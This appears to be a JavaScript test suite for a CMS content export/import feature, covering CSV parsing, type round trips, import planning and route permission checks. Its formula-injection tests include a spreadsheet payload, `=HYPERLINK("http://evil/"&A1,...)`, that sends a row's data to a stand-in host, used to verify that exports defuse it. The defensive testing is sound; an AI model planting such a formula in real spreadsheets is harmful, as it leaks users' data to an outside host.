#!/usr/bin/env node
/**
 * Taking your content out and putting it back (C-91).
 *
 * The roadmap said "REST covers export", which is true of a developer with a
 * bearer token and false of an operator with four hundred products and a
 * spreadsheet. And it phrased the import half as being for content types,
 * which would have produced a second exporter for posts.
 *
 * The tests that matter here are the ROUND TRIP (export, edit, import must not
 * lose anything) and the formula guard (an operator opening their own export
 * in Excel must not be running someone's payload).
 *
 * Run with:  node tests/content-transfer.test.mjs
 */
import fs from 'node:fs/promises';
import path from 'node:path';
import { loadTs, ROOT } from './lib/load.mjs';

const CSV = await loadTs('src/lib/csv.ts');
const T = await loadTs('src/lib/content-transfer.ts');
const route = await fs.readFile(path.join(ROOT, 'src/pages/api/transfer/[collection].ts'), 'utf8');

let passed = 0;
const failures = [];
function check(name, fn) {
  try { fn(); passed += 1; } catch (err) { failures.push(`${name}: ${err.message}`); }
}
function ok(cond, msg) { if (!cond) throw new Error(msg); }
function eq(a, b, what = '') {
  if (JSON.stringify(a) !== JSON.stringify(b)) throw new Error(`${what} expected ${JSON.stringify(b)}, got ${JSON.stringify(a)}`);
}

/**
 * Source with comments AND imports removed.
 *
 * This file had neither. Every assertion about the route ran against raw text,
 * so a comment mentioning a capability satisfied the check that the capability
 * was enforced — a test-suite audit deleted the entire import gate and this
 * file stayed green.
 *
 * Imports go too, because `import { canAuthorPosts }` satisfies a grep for
 * `canAuthorPosts` forever.
 */
function code(src) {
  return src
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/^\s*\/\/.*$/gm, '')
    .split('\n')
    .filter((l) => !l.trimStart().startsWith('import ') && !l.includes("} from '"))
    .join('\n');
}

// ─────────────────────────────────────────────────────────── CSV parsing

check('the ordinary case', () => {
  eq(CSV.parseCsvRows('a,b\n1,2'), [['a', 'b'], ['1', '2']]);
});

check('a quoted field may contain a comma, a newline and a quote', () => {
  // These three are the whole reason this is a parser and not a `split(',')`.
  eq(CSV.parseCsvRows('a,b\n"x, y","he said ""no"""'), [['a', 'b'], ['x, y', 'he said "no"']]);
  eq(CSV.parseCsvRows('a\n"line one\nline two"'), [['a'], ['line one\nline two']]);
});

check('CRLF and LF both end a row', () => {
  eq(CSV.parseCsvRows('a,b\r\n1,2\r\n'), [['a', 'b'], ['1', '2']]);
  eq(CSV.parseCsvRows('a,b\n1,2\n'), [['a', 'b'], ['1', '2']]);
});

check('a BOM is consumed, not made part of the first header', () => {
  // Excel's "CSV UTF-8" writes one. Left in place it makes the first column
  // `﻿title`, which matches no field — so that column is silently dropped.
  const table = CSV.parseCsv('﻿title,slug\nHello,hello');
  eq(table.headers, ['title', 'slug']);
  eq(table.rows[0].title, 'Hello');

  // The case `.trim()` cannot rescue, and the reason the strip is explicit
  // rather than left to the header cleanup: U+FEFF IS whitespace to
  // `String.trim`, so an unquoted header survives it either way — but a BOM in
  // front of a QUOTED first field means the cell is no longer empty when the
  // quote arrives, so the quote is taken literally and the field never opens.
  // The whole first column then reads as one broken value.
  eq(CSV.parseCsvRows('﻿"a,b",c'), [['a,b', 'c']]);
});

check('headers are matched case-insensitively', () => {
  // A spreadsheet round trip capitalises them often enough that being strict
  // would reject a file this same install exported.
  eq(CSV.parseCsv('Title,SLUG\nHello,hello').headers, ['title', 'slug']);
});

check('a short row is padded and a long one truncated', () => {
  const t = CSV.parseCsv('a,b,c\n1,2\n1,2,3,4');
  eq(t.rows[0], { a: '1', b: '2', c: '' });
  eq(t.rows[1], { a: '1', b: '2', c: '3' });
});

check('an empty document is not one empty row', () => {
  eq(CSV.parseCsv(''), { headers: [], rows: [] });
  eq(CSV.parseCsv('\n\n'), { headers: [], rows: [] });
});

// ──────────────────────────────────────────────────── formula injection

check('A FORMULA CELL IS DEFUSED ON EXPORT', () => {
  // `=HYPERLINK("http://evil/"&A1,"Click")` in a post title exfiltrates the row
  // when the operator opens their OWN export. Excel, Sheets and LibreOffice all
  // run it.
  for (const payload of ['=1+1', '+1', '-1+1', '@SUM(A1)', '\tx', '\rx']) {
    const out = CSV.escapeCsvCell(payload);
    ok(out.startsWith("'") || out.startsWith('"\''), `${JSON.stringify(payload)} → ${JSON.stringify(out)}`);
  }
});

check('...and the guard is REMOVED on import, so the round trip is lossless', () => {
  const title = '=HYPERLINK("http://evil/","Click")';
  const csv = CSV.toCsv(['title'], [{ title }]);
  ok(!csv.includes('\n=HYPERLINK'), csv);
  eq(CSV.parseCsv(csv).rows[0].title, title, 'the operator lost their text');
});

check('an ordinary hyphen in the MIDDLE is not a formula', () => {
  eq(CSV.escapeCsvCell('well-known'), 'well-known');
  eq(CSV.escapeCsvCell('a@b.com'), 'a@b.com');
});

// ───────────────────────────────────────────────── typed round trip

const DEF = {
  name: 'job',
  moderated: false,
  fields: [
    { name: 'title', rule: { type: 'string', required: true } },
    { name: 'slug', rule: { type: 'slug' } },
    { name: 'salary', rule: { type: 'number' } },
    { name: 'remote', rule: { type: 'boolean' } },
    // `of` is always set by the real builder (`field-rule-build.ts` defaults it
    // to 'string'), so a fixture without it is a shape this codebase cannot
    // produce — and it hid a defect: an `of`-less rule made `validate` report
    // "must be a undefined", which the round-trip test then blamed on the
    // matcher.
    { name: 'skills', rule: { type: 'array', of: 'string' } },
  ],
};

check('a spreadsheet erases types; the FIELD DECLARATION puts them back', () => {
  // "0" is `false` in a boolean column, zero in a number column, and the
  // character in a string column. Guessing from the text gets one wrong.
  eq(T.parseCell('0', 'boolean'), false);
  eq(T.parseCell('0', 'number'), 0);
  eq(T.parseCell('0', 'string'), '0');
});

check('a tick is written a dozen ways by a dozen spreadsheets', () => {
  for (const yes of ['true', 'TRUE', '1', 'yes', 'Y', 'on']) eq(T.parseCell(yes, 'boolean'), true, yes);
  for (const no of ['false', 'FALSE', '0', 'no', 'N', 'off']) eq(T.parseCell(no, 'boolean'), false, no);
});

check('an array cell accepts JSON or what a person actually types', () => {
  eq(T.parseCell('["a","b"]', 'array'), ['a', 'b']);
  eq(T.parseCell('a, b', 'array'), ['a', 'b'], 'a human writes this, not JSON');
  eq(T.parseCell('', 'array'), undefined, 'blank is not an empty array — it is absent');
});

check('THE ROUND TRIP: export, reopen, import, nothing lost', () => {
  const records = [
    { id: '1', title: 'Οπτικός, μερική απασχόληση', slug: 'optikos', salary: 1200, remote: false, skills: ['a', 'b'] },
    { id: '2', title: 'Line one\nline two, with a comma', slug: 'two', salary: 0, remote: true, skills: [] },
  ];
  const csv = T.exportCsv('job', records, DEF);
  const rows = CSV.parseCsv(csv).rows;
  const plan = T.planContentImport('job', rows, records, DEF);
  eq(plan.updates, 2, 'both rows should match their existing record');
  eq(plan.skipped, 0, JSON.stringify(plan.rows.map((r) => r.problem)));
  eq(plan.rows[0].values.title, 'Οπτικός, μερική απασχόληση');
  eq(plan.rows[0].values.salary, 1200);
  eq(plan.rows[0].values.remote, false, 'false must survive as a boolean');
  eq(plan.rows[1].values.title, 'Line one\nline two, with a comma');
  eq(plan.rows[1].values.remote, true);
});

// ────────────────────────────────────────────────────── the plan

check('MATCHED BY SLUG OR ID, never by position', () => {
  // An operator who sorts their spreadsheet before importing must not overwrite
  // different records.
  const existing = [{ id: 'a1', slug: 'first', title: 'First' }, { id: 'b2', slug: 'second', title: 'Second' }];
  const plan = T.planContentImport('post', [
    { slug: 'second', title: 'Second, edited' },
    { slug: 'first', title: 'First, edited' },
  ], existing);
  eq(plan.updates, 2);
  eq(plan.rows[0].id, 'b2', 'the first FILE row matched the wrong record');
  eq(plan.rows[1].id, 'a1');
});

check('a slug that matches nothing is a CREATE — that is the point of the file', () => {
  const plan = T.planContentImport('post', [{ slug: 'brand-new', title: 'New' }], []);
  eq(plan.creates, 1);
  eq(plan.rows[0].action, 'create');
});

check('AN ID FROM ANOTHER INSTALL IS REFUSED, not silently duplicated', () => {
  // It usually means the file came from a different install; treating it as a
  // create duplicates every record and nothing says so.
  const plan = T.planContentImport('post', [{ id: 'from-elsewhere', slug: 'x', title: 'X' }], []);
  eq(plan.skipped, 1);
  ok(/no record has id/.test(plan.rows[0].problem ?? ''), plan.rows[0].problem);
});

check('a new post with no slug is refused, with a reason', () => {
  const plan = T.planContentImport('post', [{ title: 'No slug here' }], []);
  eq(plan.skipped, 1);
  ok(/needs a slug/.test(plan.rows[0].problem ?? ''), plan.rows[0].problem);
});

check('the row number is the one the SPREADSHEET shows', () => {
  // Off by one here means an operator hunting row 7 edits row 6.
  const plan = T.planContentImport('post', [{ title: 'a' }, { title: 'b' }], []);
  eq(plan.rows.map((r) => r.line), [2, 3], 'the header is row 1');
});

check('a new custom record is validated against ITS OWN schema', () => {
  // The same schema the API enforces — an import must not be able to write a
  // record the API would refuse.
  const plan = T.planContentImport('job', [{ slug: 'no-title' }], [], DEF);
  eq(plan.skipped, 1);
  ok(/title/.test(plan.rows[0].problem ?? ''), plan.rows[0].problem);
});

check('A CAPITALISED FIELD SURVIVES THE ROUND TRIP', () => {
  // `parseCsv` lower-cases headers, because a spreadsheet round trip
  // capitalises them and being strict would reject a file this same install
  // exported. Content-type fields may legitimately be `firstName` or `SKU`.
  // The two never met: every capitalised column was reported unknown and its
  // value dropped — a create then failed "firstName is required", and an update
  // wrote an empty object while reporting "Imported 20 records".
  const camel = {
    name: 'person', fields: [
      { name: 'firstName', rule: { type: 'string', required: true } },
      { name: 'SKU', rule: { type: 'string' } },
    ],
  };
  const csv = T.exportCsv('person', [{ id: 'p1', firstName: 'Μαρία', SKU: 'A-1' }], camel);
  const rows = CSV.parseCsv(csv).rows;
  const plan = T.planContentImport('person', rows, [{ id: 'p1', firstName: 'Μαρία', SKU: 'A-1' }], camel);
  eq(plan.unknownColumns, [], 'the file this install exported was rejected by this install');
  eq(plan.rows[0].values.firstName, 'Μαρία', 'stored under the field\'s own spelling');
  eq(plan.rows[0].values.SKU, 'A-1');
  ok(!('firstname' in plan.rows[0].values), 'it wrote a second, lower-cased key');
});

check('AN UPDATE IS VALIDATED TOO, not only a create', () => {
  // The first version validated creates only, so a row whose slug matched an
  // existing record wrote straight through: unbounded strings, wrong types,
  // control characters. Create-versus-update is the sibling gap this module's
  // own header names as the codebase's most reliable bug.
  const existing = [{ id: 'j1', slug: 'optikos', title: 'Old' }];
  const plan = T.planContentImport('job', [{ slug: 'optikos', salary: 'not-a-number' }], existing, DEF);
  eq(plan.updates, 0, 'an invalid update was accepted');
  eq(plan.skipped, 1);
  ok(/salary/.test(plan.rows[0].problem ?? ''), plan.rows[0].problem);
});

check('...but an update is a PATCH, so an absent required field is not missing', () => {
  // Validating the partial bag against the FULL schema would refuse every
  // legitimate partial update — an operator editing one column in Excel.
  const existing = [{ id: 'j1', slug: 'optikos', title: 'Old' }];
  const plan = T.planContentImport('job', [{ slug: 'optikos', salary: '1500' }], existing, DEF);
  eq(plan.updates, 1, JSON.stringify(plan.rows[0]));
  eq(plan.rows[0].values.salary, 1500);
  ok(!('title' in plan.rows[0].values), 'it invented a title');
});

check('A MODERATION STATE SURVIVES A CREATE', () => {
  // `_status` is not a schema field, so `validate` stripped it — which meant
  // exporting a moderated collection and importing it PUBLISHED every comment
  // that had been rejected.
  const moderated = { name: 'comment', moderated: true, fields: [{ name: 'body', rule: { type: 'string', required: true } }] };
  const plan = T.planContentImport('comment', [{ body: 'spam', _status: 'rejected' }], [], moderated);
  eq(plan.creates, 1, JSON.stringify(plan.rows[0]));
  eq(plan.rows[0].values._status, 'rejected', 'a rejected comment would import as approved');
});

check('...and an unmoderated collection does not gain one', () => {
  const plan = T.planContentImport('job', [{ title: 'A', _status: 'rejected' }], [], DEF);
  ok(!('_status' in plan.rows[0].values), JSON.stringify(plan.rows[0].values));
});

check('a column the collection has no field for is REPORTED, not silently eaten', () => {
  const plan = T.planContentImport('job', [{ title: 'A', nonsense: 'x' }], [], DEF);
  eq(plan.unknownColumns, ['nonsense']);
  ok(!('nonsense' in plan.rows[0].values), 'it was written anyway');
});

check('`id` in the file never becomes a FIELD', () => {
  const plan = T.planContentImport('post', [{ slug: 'x', title: 'X' }], []);
  ok(!('id' in plan.rows[0].values), JSON.stringify(plan.rows[0].values));
});

check('PLANNING WRITES NOTHING', () => {
  // It is what lets the admin preview 400 changes before committing, and what
  // makes the preview trustworthy — the endpoint applies this same plan.
  //
  // Checked by BEHAVIOUR, not by reading the function's own text: the first
  // version called `.toString()` on the planner, which cannot see inside
  // `transferColumns` or `columnTypes`. An audit added a write to one of those
  // and this test stayed green.
  //
  // A stub whose every method throws catches a write from any depth.
  const previous = globalThis.LocalDB;
  const tripwire = new Proxy({}, {
    get(_t, prop) {
      return () => { throw new Error(`the planner called LocalDB.${String(prop)}`); };
    },
  });
  globalThis.LocalDB = tripwire;
  try {
    const plan = T.planContentImport('job', [{ title: 'A', slug: 'a' }], [], DEF);
    ok(plan.rows.length === 1, 'the planner did not run');
  } finally {
    if (previous === undefined) delete globalThis.LocalDB;
    else globalThis.LocalDB = previous;
  }
  // ...and it is synchronous, so it cannot be awaiting a write either.
  ok(!/^async /.test(T.planContentImport.toString()), 'the planner is async, so it can await I/O');
});

// ──────────────────────────────────────────────────────── columns

check('a counter is NOT exported — re-importing would reset it', () => {
  ok(!T.POST_COLUMNS.includes('views'), 'views round-trips and would destroy analytics');
  ok(!T.POST_COLUMNS.includes('created_at'), 'created_at is the storage layer\'s');
});

check('a moderated collection exports its STATE', () => {
  // Exporting comments without which were approved gives a file that cannot be
  // put back.
  ok(T.transferColumns('c', { name: 'c', moderated: true, fields: [] }).includes('_status'));
  ok(!T.transferColumns('c', { name: 'c', moderated: false, fields: [] }).includes('_status'));
});

check('the columns are the same list for the exporter and the importer', () => {
  const cols = T.transferColumns('job', DEF);
  const plan = T.planContentImport('job', [], [], DEF);
  eq(plan.columns, cols);
});

// ────────────────────────────────────────────────────── JSON side

check('JSON import accepts an array or a { rows } object', () => {
  eq(T.readImportRows('[{"slug":"a"}]', 'json'), [{ slug: 'a' }]);
  eq(T.readImportRows('{"rows":[{"slug":"a"}]}', 'json'), [{ slug: 'a' }]);
});

check('a broken file says what is wrong', () => {
  for (const [body, want] of [['not json', /valid JSON/], ['{"a":1}', /array/]]) {
    let msg = '';
    try { T.readImportRows(body, 'json'); } catch (e) { msg = e.message; }
    ok(want.test(msg), `${body} → ${msg}`);
  }
});

// ───────────────────────────────────────────────────── the endpoint

check('ONE ROUTE for posts, pages and custom types', () => {
  eq(T.collectionKind('post'), 'post');
  eq(T.collectionKind('page'), 'page');
  eq(T.collectionKind('job'), 'custom');
  ok(/params\.collection/.test(route), 'the collection is not a parameter');
});

check('export is closed, and import is closed HARDER', () => {
  // Export is everything the site holds; import writes site-wide and cannot be
  // undone, so it takes the same capability the site importer does.
  //
  // Asserted on the CALL, against comment- and import-stripped source. The
  // first version matched raw text, so an audit deleted the whole gate —
  // replacing it with `return true` and a comment mentioning the capability —
  // and this file still reported 39 passed.
  const src = code(route);
  ok(/if \(!canAuthorPosts\(locals\.user\.role\)\)/.test(src), 'export is not gated');
  ok(/hasCapability\(locals\.user\?\.role, 'import_content'/.test(src), 'import does not require import_content');
  ok(/if \(!\(await mayImport\(locals\)\)\)/.test(src), 'the import gate is computed and not acted on');
});

check('EXPORT APPLIES VISIBILITY — it is the widest read there is', () => {
  // An author must not be able to export a colleague's drafts. This is the
  // defect the security audit found, and it deserves an assertion that fails
  // when the filter is removed rather than when a comment is reworded.
  const src = code(route);
  ok(/visibleContent\(await LocalDB\.getPosts\(\), viewer\)/.test(src), 'the export reads every post');
  ok(/loadCollection\(name, locals\.user\)/.test(src), 'the viewer is not passed in');
});

check('the row limit is enforced, not merely defined', () => {
  ok(/rows\.length > MAX_IMPORT_ROWS/.test(code(route)), 'MAX_IMPORT_ROWS is a constant nothing reads');
});

check('IMPORT PREVIEWS unless told to apply', () => {
  ok(/body\?\.apply !== true/.test(route), 'it applies by default');
});

check('the KIND comes from the route, not from the file', () => {
  // A page imported through /api/transfer/post would appear under /blog/<slug>
  // and be unreachable at its own address.
  ok(/kind: name === 'page' \? 'page' : 'post'/.test(route), 'the kind is taken from the row');
});

check('an import is audited', () => {
  ok(/AUDIT\.CONTENT_IMPORT/.test(route), 'nothing records that content was overwritten');
});

check('the CSV export carries a BOM', () => {
  // Without it Excel reads UTF-8 as the system code page and every Greek title
  // becomes mojibake — on both of this project\'s live shops.
  ok(/'﻿' \+ exportCsv/.test(route), 'no BOM on the export');
});

if (failures.length) {
  console.error(`\n✗ content-transfer: ${failures.length} failed, ${passed} passed\n`);
  for (const f of failures) console.error(`  · ${f}`);
  process.exit(1);
}
console.log(`✓ content-transfer: ${passed} passed`);
